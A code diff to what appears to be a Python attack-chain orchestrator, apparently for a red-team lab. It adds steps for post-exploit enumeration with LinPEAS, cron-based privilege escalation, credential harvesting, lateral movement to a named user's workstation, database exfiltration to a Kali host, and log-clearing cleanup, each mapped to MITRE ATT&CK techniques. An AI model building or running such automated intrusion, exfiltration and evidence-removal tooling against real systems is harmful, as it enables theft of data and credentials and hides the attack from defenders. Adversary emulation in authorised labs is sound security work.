@@ -51,22 +51,41 @@ STEP_META = {
         "techniques": ["T1190", "T1059.004"],
         "color": "yellow",
     },
+    "post_exploit_enumeration": {
+        "tactic": "TA0007 · Discovery",
+        "techniques": ["T1082", "T1087.001", "T1057", "T1053.003", "T1016", "T1552.001"],
+        "color": "blue",
+    },
     "privesc": {
         "tactic": "TA0004 · Privilege Escalation",
         "techniques": ["T1053.003", "T1068"],
         "color": "red",
     },
     "creds": {
-        "tactic": "TA0006 · Credential Access · TA0007 · Discovery",
-        "techniques": ["T1552.001", "T1018", "T1046", "T1110.004"],
+        "tactic": "TA0006 · Credential Access",
+        "techniques": ["T1552.001"],
         "color": "blue",
     },
     "lateral": {
-        "tactic": "TA0008 · Lateral Movement",
-        "techniques": ["T1021.004", "T1078"],
+        "tactic": "TA0007 · Discovery · TA0008 · Lateral Movement",
+        "techniques": ["T1018", "T1046", "T1110.004", "T1021.004", "T1078"],
         "color": "magenta",
     },
-    "cleanup": {"tactic": "operator hygiene", "techniques": [], "color": "green"},
+    "enumeration_john_ws": {
+        "tactic": "TA0007 · Discovery",
+        "techniques": ["T1082", "T1087.001", "T1016", "T1083", "T1552.001", "T1552.004"],
+        "color": "blue",
+    },
+    "exfiltrate": {
+        "tactic": "TA0009 · Collection · TA0010 · Exfiltration",
+        "techniques": ["T1552.001", "T1213", "T1041"],
+        "color": "red",
+    },
+    "cleanup": {
+        "tactic": "TA0005 · Defense Evasion",
+        "techniques": ["T1070", "T1070.003", "T1070.004"],
+        "color": "green",
+    },
 }
 
 
@@ -79,6 +98,7 @@ class Context:
     kali_host: str = DEFAULT_KALI_HOST
     wordlist: str = DEFAULT_WORDLIST
     mode: str = "basic"
+    linpeas: bool = True
     state: dict[str, Any] = field(default_factory=dict)
 
 
@@ -129,10 +149,11 @@ def _print_step_result(
     console.print()
     meta = STEP_META.get(step.name, {})
     color = meta.get("color", "white")
+    ts = f"[dim][{_iso_utc()}][/dim]  "
     if success:
-        msg = f"[bold green]✓[/bold green]  [bold {color}]{step.name}[/bold {color}]  [green]completed[/green]  [dim]{elapsed:.1f}s[/dim]"
+        msg = f"{ts}[bold green]✓[/bold green]  [bold {color}]{step.name}[/bold {color}]  [green]completed[/green]  [dim]{elapsed:.1f}s[/dim]"
     else:
-        msg = f"[bold red]✗[/bold red]  [bold {color}]{step.name}[/bold {color}]  [red]failed[/red]  [dim]{elapsed:.1f}s[/dim]  [red]{error}[/red]"
+        msg = f"{ts}[bold red]✗[/bold red]  [bold {color}]{step.name}[/bold {color}]  [red]failed[/red]  [dim]{elapsed:.1f}s[/dim]  [red]{error}[/red]"
     console.print(msg)
     console.print()
 
@@ -217,10 +238,23 @@ def _step_exploit(ctx: Context) -> dict[str, Any]:
     return {"www_shell": www_shell}
 
 
+def _step_post_exploit_enumeration(ctx: Context) -> dict[str, Any]:
+    from post_exploit_enumeration import run as enum_run
+
+    findings = enum_run(www_shell=ctx.state["www_shell"], kali_host=ctx.kali_host, use_linpeas=ctx.linpeas)
+    if not findings.get("cron_script"):
+        raise RuntimeError("post-exploit enumeration found no writable cron script — cannot escalate")
+    return findings
+
+
 def _step_privesc(ctx: Context) -> dict[str, Any]:
     from privesc import run as privesc_run
 
-    root_shell = privesc_run(ctx.state["www_shell"], kali_host=ctx.kali_host)
+    root_shell = privesc_run(
+        ctx.state["www_shell"],
+        kali_host=ctx.kali_host,
+        cron_script=ctx.state["cron_script"],
+    )
     if root_shell is None:
         raise RuntimeError("privesc returned no root shell")
     return {"root_shell": root_shell}
@@ -230,27 +264,69 @@ def _step_creds(ctx: Context) -> dict[str, Any]:
     from credential_stuffing import run as creds_run
 
     result = creds_run(ctx.state["root_shell"])
-    if not result.get("john_ip"):
-        raise RuntimeError("credential stuffing found no usable account on the internal subnet")
-    return {
-        "john_ip": result["john_ip"],
-        "john_password": result["john_password"],
-        "creds_scan": result.get("scanned_hosts", []),
-        "creds_successes": result.get("successes", []),
-    }
+    if not result.get("john_password"):
+        raise RuntimeError("credential discovery found no usable password on apache")
+    return {"john_password": result["john_password"]}
 
 
 def _step_lateral(ctx: Context) -> dict[str, Any]:
     from lateral_movement import run as lateral_run
 
-    john_shell = lateral_run(
+    result = lateral_run(
         root_shell=ctx.state["root_shell"],
         kali_host=ctx.kali_host,
-        workstation_ip=ctx.state.get("john_ip"),
+        john_password=ctx.state.get("john_password"),
     )
-    if john_shell is None:
+    if result["john_shell"] is None:
         raise RuntimeError("lateral movement returned no john.stravidis shell")
-    return {"john_shell": john_shell}
+    return {
+        "john_shell": result["john_shell"],
+        "failed_lateral_targets": result["failed_lateral_targets"],
+        "failed_lateral_password_failures": result["failed_lateral_password_failures"],
+    }
+
+
+def _step_enumeration_john_ws(ctx: Context) -> dict[str, Any]:
+    from enumeration_john_ws import run as enum_run
+
+    result = enum_run(
+        john_shell=ctx.state["john_shell"],
+        kali_host=ctx.kali_host,
+    )
+    return {
+        "db_creds":         result["db_creds"],
+        "ssh_key":          result["ssh_key"],
+        "discovered_hosts": result["discovered_hosts"],
+        "local_dbs":        result["local_dbs"],
+        "credential_files": result["credential_files"],
+    }
+
+
+def _step_exfiltrate(ctx: Context) -> dict[str, Any]:
+    from exfiltrate_db import run as exfiltrate_run
+
+    result = exfiltrate_run(
+        john_shell=ctx.state["john_shell"],
+        kali_host=ctx.kali_host,
+        db_creds=ctx.state.get("db_creds"),   # set by enumeration_john_ws if it ran
+    )
+    if not result.get("exfil_ok"):
+        raise RuntimeError("exfiltration transfer failed — dump not received on kali")
+    return {
+        "db_creds":    result["db_creds"],
+        "exfil_path":  result["exfil_path"],
+        "exfil_stats": result["stats"],
+    }
+
+
+def _step_cleanup(ctx: Context) -> dict[str, Any]:
+    from defensive_evasion import run as cleanup_run
+
+    cleanup_run(
+        root_shell=ctx.state.get("root_shell"),
+        john_shell=ctx.state.get("john_shell"),
+    )
+    return {}
 
 
 def _teardown_close_socket(key: str) -> Callable[[Context], None]:
@@ -273,9 +349,14 @@ CHAIN_BASIC: list[Step] = [
     Step("recon", _step_recon),
     Step("exploit", _step_exploit, teardown=_teardown_close_socket("www_shell")),
     Step(
+        "post_exploit_enumeration",
+        _step_post_exploit_enumeration,
+        requires=("www_shell",),
+    ),
+    Step(
         "privesc",
         _step_privesc,
-        requires=("www_shell",),
+        requires=("www_shell", "cron_script"),
         teardown=_teardown_close_socket("root_shell"),
     ),
     Step(
@@ -286,8 +367,23 @@ CHAIN_BASIC: list[Step] = [
     Step(
         "lateral",
         _step_lateral,
-        requires=("root_shell",),  # john_ip optional: used if present, else deploy.log fallback
+        requires=("root_shell",),  # john_password optional: falls back to hardcoded default
         teardown=_teardown_close_socket("john_shell"),
+    ),
+    Step(
+        "enumeration_john_ws",
+        _step_enumeration_john_ws,
+        requires=("john_shell",),
+    ),
+    Step(
+        "exfiltrate",
+        _step_exfiltrate,
+        requires=("john_shell",),
+    ),
+    Step(
+        "cleanup",
+        _step_cleanup,
+        optional=True,
     ),
 ]
 
@@ -391,6 +487,7 @@ def run_chain(ctx: Context, *, only=None, start=None, stop=None) -> Context:
             _print_step_header(step, i, len(selected))
             started = _iso_utc()
             t0 = time.perf_counter()
+            delta = {}
             ok = True
             err = ""
             try:
@@ -464,6 +561,8 @@ def _parse_args(argv: list[str]) -> argparse.Namespace:
     sel.add_argument("--only", choices=step_names)
     sel.add_argument("--from", dest="start", choices=step_names)
     p.add_argument("--to", dest="stop", choices=step_names)
+    p.add_argument("--no-linpeas", dest="linpeas", action="store_false", default=True,
+                   help="Skip LinPEAS and use targeted commands only (default: LinPEAS enabled)")
     p.add_argument("--list", action="store_true")
     p.add_argument("-v", "--verbose", action="store_true")
 
@@ -495,9 +594,11 @@ def _list_steps(mode: str = DEFAULT_MODE) -> None:
 
 def main(argv: list[str] | None = None) -> int:
     args = _parse_args(sys.argv[1:] if argv is None else argv)
+    logging.Formatter.converter = time.gmtime  # render %(asctime)s in UTC
     logging.basicConfig(
         level=logging.DEBUG if args.verbose else logging.WARNING,
-        format="[dim][%(name)s][/dim] %(message)s",
+        format="[dim][%(asctime)s] [%(name)s][/dim] %(message)s",
+        datefmt="%Y-%m-%dT%H:%M:%SZ",
     )
     if args.list:
         _list_steps(args.mode)
@@ -509,6 +610,7 @@ def main(argv: list[str] | None = None) -> int:
         kali_host=args.kali_host,
         wordlist=args.wordlist,
         mode=args.mode,
+        linpeas=args.linpeas,
     )
     run_chain(ctx, only=args.only, start=args.start, stop=args.stop)
     return 0
